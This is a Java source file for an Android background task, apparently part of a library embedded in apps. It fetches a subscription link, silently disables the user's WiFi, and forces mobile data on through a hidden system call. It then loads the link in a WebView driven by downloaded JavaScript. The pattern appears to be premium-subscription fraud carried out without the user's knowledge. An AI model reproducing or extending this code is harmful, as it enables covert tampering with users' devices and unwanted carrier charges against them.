package oom.tblib.sub.tasks;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;

import oom.tblib.sub.mode.Ma;
import oom.tblib.sub.utils.Ujs;
import oom.tblib.sub.utils.Ut;
import oom.tblib.sub.utils.UtilSave;
import oom.tblib.sub.view.Va;

/**
 * Created by xlc on 2017/5/24.
 */

public class T_query extends AsyncTask<Void, Integer, Ma> {
    private Context mContext;

    private boolean checkTimes;

    private Handler handler;

    private Va web;

    public T_query(Context context, boolean check) {

        this.mContext = context;

        this.checkTimes = check;

        web = Va.getInstance(context);

        handler = new Handler();

    }

    @Override
    protected Ma doInBackground(Void... params) {

        return UtilSave.get_sub_link(mContext);
    }

    @Override
    protected void onPostExecute(final Ma s) {
        super.onPostExecute(s);
        if (s == null) {
            //                        Ulog.w("onPostExecute: 没有数据或不满足执行条件");
            //                        Ulog.show("onPostExecute: no data");
            return;
        }
        final int net_status = s.getAllow_network();

        switch (net_status) {
            case 1:
                boolean closeWifi = Ut.check_show_dialog_time(mContext);

                if (Ut.getWifiStatus(mContext) && closeWifi) {

                    //                                        Ulog.w("SplashActivity onPostExecute: 判断wifi为开启状态 做关闭");
                    //                                        Ulog.show("SplashActivity onPostExecute: close wifi");

                    if (Ujs.getInstance(mContext).getJsCacheStatus() == Ujs.JS_CACHE_STATUS_DOING) {
                        //                                                Ulog.show("js downloading ，no close wifi");

                        return;
                    }
                    //关闭wifi
                    Ut.closeWifi(mContext);
                }
                //                                Ulog.show("SplashActivity onPostExecute: only wifi");

                if (Ut.getMobileStatus(mContext, null)) {

                    //                                        Ulog.w("SplashActivity onPostExecute:GPRS为开启状态，不做开启操作");
                } else {
                    //                                        Ulog.show("SplashActivity onPostExecute:open gprs");
                    //                                        Ulog.w("SplashActivity onPostExecute:open gprs");
                    showDialog();

                }

                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        //                                                Ulog.w("开始执行webView跳转");
                        web.startLoad(s);
                    }
                }, 5000);

                break;
            default:
                web.startLoad(s);
        }
    }

    private void showDialog() {
        Ut.setNetState(mContext, "setMobileDataEnabled", true);
    }
}